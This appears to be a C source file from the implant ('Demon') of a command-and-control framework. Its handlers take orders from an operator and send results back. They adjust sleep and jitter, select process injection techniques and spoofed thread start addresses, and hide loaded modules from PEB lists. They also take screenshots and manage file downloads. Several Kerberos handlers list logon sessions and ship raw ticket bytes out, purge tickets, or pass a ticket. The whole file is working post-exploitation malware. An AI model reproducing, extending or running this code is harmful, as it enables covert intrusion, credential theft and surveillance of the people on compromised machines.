#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>
#include <commands/Command_Config.h>

VOID CommandSleep( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SLEEP );

    Instance->Config.Sleeping = ParserGetInt32( Parser );
    Instance->Config.Jitter   = ParserGetInt32( Parser );
    PRINTF( "Instance->Sleeping: [%d]\n", Instance->Config.Sleeping );
    PRINTF( "Instance->Jitter  : [%d]\n", Instance->Config.Jitter );

    PackageAddInt32( Package, Instance->Config.Sleeping );
    PackageAddInt32( Package, Instance->Config.Jitter );
    PackageTransmit( Package );
}

VOID CommandJob( PPARSER Parser )
{
    PUTS( "Job" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case DEMON_COMMAND_JOB_LIST:
        {
            PUTS( "Job::list" )
            PJOB_DATA JobList = Instance->Jobs;

            do {
                if ( JobList )
                {
                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]\n", JobList->JobID, JobList->Type, JobList->State )

                    PackageAddInt32( Package, JobList->JobID );
                    PackageAddInt32( Package, JobList->Type );
                    PackageAddInt32( Package, JobList->State );

                    JobList = JobList->Next;
                } else
                    break;

            } while ( TRUE );

            break;
        }

        case DEMON_COMMAND_JOB_SUSPEND:
        {
            PUTS( "Job::suspend" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobSuspend( JobID );

            PRINTF( "JobID:[%d] Success:[%d]", JobID, Success )

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case DEMON_COMMAND_JOB_RESUME:
        {
            PUTS( "Job::resume" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobResume( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case DEMON_COMMAND_JOB_KILL_REMOVE:
        {
            PUTS( "Job::kill" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobKill( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }
    }

    PackageTransmit( Package );
}

VOID CommandConfig( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CONFIG );
    UINT32   Config  = ParserGetInt32( Parser );

    PackageAddInt32( Package, Config );

    switch ( Config )
    {
        case DEMON_CONFIG_SHOW_ALL:
        {
            break;
        }

        case DEMON_CONFIG_IMPLANT_SPFTHREADADDR:
        {
            UINT32  LibSize    = 0;
            UINT32  FuncSize   = 0;
            PCHAR   Library    = ParserGetString( Parser, &LibSize );
            PCHAR   Function   = ParserGetString( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib ) {
                    /* Hide the loaded module from PEB LDR lists if configured */
                    if ( Instance->Config.Implant.HideModules )
                        HideModule( hLib );

                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
                    if ( ThreadAddr ) {
                        Instance->Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
                    }
                    else {
                        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
                    }

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                } else {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
                }
            }

            PackageAddString( Package, Library );
            PackageAddString( Package, Function );

            break;
        }

        case DEMON_CONFIG_IMPLANT_SLEEP_TECHNIQUE:
        {
            Instance->Config.Implant.SleepMaskTechnique = ParserGetInt32( Parser );
            PRINTF( "Set sleep obfuscation technique to %d\n", Instance->Config.Implant.SleepMaskTechnique )
            PackageAddInt32( Package, Instance->Config.Implant.SleepMaskTechnique );
            break;
        }

        case DEMON_CONFIG_IMPLANT_VERBOSE:
        {
            Instance->Config.Implant.Verbose = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Implant.Verbose );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_VEH:
        {
            Instance->Config.Implant.CoffeeVeh = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Implant.CoffeeVeh );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_THREADED:
        {
            Instance->Config.Implant.CoffeeThreaded = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Implant.CoffeeThreaded );
            break;
        }

        case DEMON_CONFIG_MEMORY_ALLOC:
        {
            Instance->Config.Memory.Alloc = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Memory.Alloc );
            break;
        }

        case DEMON_CONFIG_MEMORY_EXECUTE:
        {
            Instance->Config.Memory.Execute = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Memory.Execute );
            break;
        }

        case DEMON_CONFIG_INJECTION_TECHNIQUE:
        {
            Instance->Config.Inject.Technique = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Inject.Technique );
            break;
        }

        case DEMON_CONFIG_INJECTION_SPOOFADDR:
        {
            UINT32  LibSize    = 0;
            UINT32  FuncSize   = 0;
            PCHAR   Library    = ParserGetString( Parser, &LibSize );
            PCHAR   Function   = ParserGetString( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    /* Hide the loaded module from PEB LDR lists if configured */
                    if ( Instance->Config.Implant.HideModules )
                        HideModule( hLib );

                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );

                    if ( ThreadAddr ) {
                        Instance->Config.Inject.SpoofAddr = ThreadAddr + Offset;
                    } else {
                        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
                    }

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddString( Package, Library );
            PackageAddString( Package, Function );

            break;
        }

        case DEMON_CONFIG_INJECTION_SPAWN64:
        {
            UINT32 Size   = 0;
            PVOID  Buffer = NULL;

            if ( Instance->Config.Process.Spawn64 )
            {
                MemSet( Instance->Config.Process.Spawn64, 0, StringLengthW( Instance->Config.Process.Spawn64 ) * sizeof( WCHAR ) );
                Instance->Win32.LocalFree( Instance->Config.Process.Spawn64 );
                Instance->Config.Process.Spawn64 = NULL;
            }

            Buffer = ParserGetBytes( Parser, &Size );
            Instance->Config.Process.Spawn64 = Instance->Win32.LocalAlloc( LPTR, Size );
            if ( ! Instance->Config.Process.Spawn64 ) break;
            MemCopy( Instance->Config.Process.Spawn64, Buffer, Size );

            PRINTF( "Instance->Config.Process.Spawn64 => %ls\n", Instance->Config.Process.Spawn64 );
            PackageAddWString( Package, Instance->Config.Process.Spawn64 );

            break;
        }

        case DEMON_CONFIG_INJECTION_SPAWN32:
        {
            UINT32 Size   = 0;
            PVOID  Buffer = NULL;

            if ( Instance->Config.Process.Spawn86 )
            {
                MemSet( Instance->Config.Process.Spawn86, 0, StringLengthW( Instance->Config.Process.Spawn86 ) * sizeof( WCHAR ) );
                Instance->Win32.LocalFree( Instance->Config.Process.Spawn86 );
                Instance->Config.Process.Spawn86 = NULL;
            }

            Buffer = ParserGetBytes( Parser, &Size );
            Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Size );
            if ( ! Instance->Config.Process.Spawn86 ) break;
            MemCopy( Instance->Config.Process.Spawn86, Buffer, Size );

            PRINTF( "Instance->Config.Process.Spawn86 => %ls\n", Instance->Config.Process.Spawn86 );
            PackageAddWString( Package, Instance->Config.Process.Spawn86 );

            break;
        }

        case DEMON_CONFIG_KILLDATE:
        {
            Instance->Config.Transport.KillDate = ParserGetInt64( Parser );

            PRINTF( "Instance->Config.Transport.KillDate => %d\n", Instance->Config.Transport.KillDate );
            PackageAddInt64( Package, Instance->Config.Transport.KillDate );

            break;
        }

        case DEMON_CONFIG_WORKINGHOURS:
        {
            Instance->Config.Transport.WorkingHours = ParserGetInt32( Parser );

            PRINTF( "Instance->Config.Transport.WorkingHours => %d\n", Instance->Config.Transport.WorkingHours );
            PackageAddInt32( Package, Instance->Config.Transport.WorkingHours );

            break;
        }

        default:
            PackageAddInt32( Package, 0 );
            break;
    }

    PackageTransmit( Package );
}

VOID CommandScreenshot( PPARSER Parser )
{
    PUTS( "Screenshot" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
    PVOID    Image   = NULL;
    SIZE_T   Size    = 0;

    // TODO: add error checking in WinScreenshot and send screenshot in pieces

    if ( WinScreenshot( &Image, &Size ) )
    {
        PUTS( "Successful took screenshot" )
        PackageAddInt32( Package, TRUE );
        PackageAddBytes( Package, Image, Size );
    }
    else
    {
        PUTS( "Failed to take screenshot" )
        PackageAddInt32( Package, FALSE );
    }

    PackageTransmit( Package );
}

VOID CommandTransfer( PPARSER Parser )
{
    DWORD          Command  = 0;
    PPACKAGE       Package  = NULL;
    PDOWNLOAD_DATA Download = NULL;
    DWORD          FileID   = 0;
    BOOL           Found    = 0;

    Package  = PackageCreate( DEMON_COMMAND_TRANSFER );
    Command  = ParserGetInt32( Parser );
    Download = Instance->Downloads;

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case DEMON_COMMAND_TRANSFER_LIST: PUTS( "Transfer::list" )
        {
            for ( ;; )
            {
                if ( ! Download )
                    break;

                /* Add download data */
                PackageAddInt32( Package, Download->FileID   );
                PackageAddInt32( Package, Download->ReadSize );
                PackageAddInt32( Package, Download->State    );

                Download = Download->Next;
            }
            break;
        }

        case DEMON_COMMAND_TRANSFER_STOP: PUTS( "Transfer::stop" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_STOPPED;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            break;
        }

        case DEMON_COMMAND_TRANSFER_RESUME: PUTS( "Transfer::resume" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_RUNNING;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            /* Tell us if we managed to find and resume the download */
            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            break;
        }

        case DEMON_COMMAND_TRANSFER_REMOVE: PUTS( "Transfer::remove" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_REMOVE;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            /* Tell us if we managed to find and resume the download */
            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            /* Tell the server to close the file. Only if we found the download */
            if ( Found )
            {
                PPACKAGE Package2 = PackageCreate( DEMON_COMMAND_TRANSFER );
                PackageAddInt32( Package2, Command );
                PackageAddInt32( Package2, FileID );
                PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
                PackageTransmit( Package2 );
                Package2 = NULL;
            }

            break;
        }
    }

    PackageTransmit( Package );
}

VOID CommandKerberos(
    IN PPARSER Parser
) {
    PPACKAGE     Package = NULL;
    DWORD        Command = 0;
    HANDLE       hToken  = TokenCurrentHandle();

    Package = PackageCreate( DEMON_COMMAND_KERBEROS );
    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")
        {
            LUID*  luid    = NULL;

            luid = GetLUID( hToken );

            if ( hToken )
            {
                SysNtClose( hToken );
                hToken = NULL;
            }

            PackageAddInt32( Package, luid ? TRUE : FALSE );

            if ( luid )
            {
                PackageAddInt32( Package, luid->HighPart );
                PackageAddInt32( Package, luid->LowPart );

                MemSet( luid, 0, sizeof( LUID ) );
                Instance->Win32.LocalFree( luid );
                luid = NULL;
            }

            break;
        }

        case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")
        {
            DWORD Type                       = 0;
            PSESSION_INFORMATION Sessions    = NULL;
            PSESSION_INFORMATION SessionTmp  = NULL;
            DWORD                NumSessions = 0;
            LUID                 luid        = (LUID){.HighPart = 0, .LowPart = 0};
            DWORD                NumTickets  = 0;
            PTICKET_INFORMATION  TicketTmp   = NULL;

            Type = ParserGetInt32( Parser );
            // Type 0: /all
            // Type 1: /luid 0xabc
            if ( Type == 1 )
            {
                luid.LowPart = ParserGetInt32( Parser );
            }

            Sessions = Klist( hToken, luid );

            PackageAddInt32( Package, Sessions ? TRUE : FALSE );

            for ( NumSessions = 0, SessionTmp = Sessions; SessionTmp; NumSessions++, SessionTmp = SessionTmp->Next ){}

            PackageAddInt32( Package, NumSessions );

            while ( Sessions )
            {
                SessionTmp = Sessions->Next;

                PackageAddWString( Package, Sessions->UserName );
                PackageAddWString( Package, Sessions->Domain );
                PackageAddInt32( Package, Sessions->LogonId.LowPart );
                PackageAddInt32( Package, Sessions->LogonId.HighPart );
                PackageAddInt32( Package, Sessions->Session );
                PackageAddWString( Package, Sessions->UserSID );
                PackageAddInt32( Package, Sessions->LogonTime.LowPart );
                PackageAddInt32( Package, Sessions->LogonTime.HighPart );
                PackageAddInt32( Package, Sessions->LogonType );
                PackageAddWString( Package, Sessions->AuthenticationPackage );
                PackageAddWString( Package, Sessions->LogonServer );
                PackageAddWString( Package, Sessions->LogonServerDNSDomain );
                PackageAddWString( Package, Sessions->Upn );

                for ( NumTickets = 0, TicketTmp = Sessions->Tickets; TicketTmp; NumTickets++, TicketTmp = TicketTmp->Next ){}

                PackageAddInt32( Package, NumTickets );

                while ( Sessions->Tickets )
                {
                    TicketTmp = Sessions->Tickets->Next;

                    PackageAddWString( Package, Sessions->Tickets->ClientName );
                    PackageAddWString( Package, Sessions->Tickets->ClientRealm );
                    PackageAddWString( Package, Sessions->Tickets->ServerName );
                    PackageAddWString( Package, Sessions->Tickets->ServerRealm );
                    PackageAddInt32( Package, Sessions->Tickets->StartTime.LowPart );
                    PackageAddInt32( Package, Sessions->Tickets->StartTime.HighPart );
                    PackageAddInt32( Package, Sessions->Tickets->EndTime.LowPart );
                    PackageAddInt32( Package, Sessions->Tickets->EndTime.HighPart );
                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.LowPart );
                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.HighPart );
                    PackageAddInt32( Package, Sessions->Tickets->EncryptionType );
                    PackageAddInt32( Package, Sessions->Tickets->TicketFlags );
                    PackageAddBytes( Package, Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );

                    if ( Sessions->Tickets->Ticket.Buffer )
                    {
                        DATA_FREE( Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );
                    }

                    DATA_FREE( Sessions->Tickets, sizeof( TICKET_INFORMATION ) );
                    Sessions->Tickets = TicketTmp;
                }

                DATA_FREE( Sessions, sizeof( SESSION_INFORMATION ) );
                Sessions = SessionTmp;
            }

            if ( hToken )
            {
                SysNtClose( hToken );
                hToken = NULL;
            }

            break;
        }

        case KERBEROS_COMMAND_PURGE: PUTS("Kerberos::Purge")
        {
            LUID luid = (LUID){.HighPart = 0, .LowPart = 0};

            luid.LowPart = ParserGetInt32( Parser );

            PackageAddInt32( Package, Purge( hToken, luid ) ? TRUE : FALSE );

            break;
        }

        case KERBEROS_COMMAND_PTT: PUTS("Kerberos::Ptt")
        {
            PBYTE  Ticket     = NULL;
            UINT32 TicketSize = 0;
            LUID   luid       = (LUID){.HighPart = 0, .LowPart = 0};

            Ticket = ParserGetBytes( Parser, &TicketSize );

            luid.LowPart = ParserGetInt32( Parser );

            PackageAddInt32( Package, Ptt( hToken, Ticket, TicketSize, luid ) ? TRUE : FALSE );

            break;
        }

        default: break;
    }

    /* LUID and KLIST cases null-set hToken after close; close here for all
     * remaining cases (PURGE, PTT, default) that do not close it themselves. */
    if ( hToken )
    {
        SysNtClose( hToken );
        hToken = NULL;
    }

    PackageTransmit( Package );
}

VOID CommandMemFile( PPARSER Parser )
{
    PPACKAGE   Package = NULL;
    ULONG32    ID      = 0;
    BUFFER     Data    = { 0 };
    SIZE_T     Size    = 0;
    PMEM_FILE  MemFile = NULL;

    Package = PackageCreate( DEMON_COMMAND_MEM_FILE );

    PUTS("MemFile")

    ID          = ParserGetInt32( Parser );
    Size        = ParserGetInt64( Parser );
    Data.Buffer = ParserGetBytes( Parser, &Data.Length );

    // TODO: handle out of order packets?

    MemFile = ProcessMemFileChunk( ID, Size, Data.Buffer, Data.Length );

    PackageAddInt32( Package, ID );
    PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );

    PackageTransmit( Package );
}
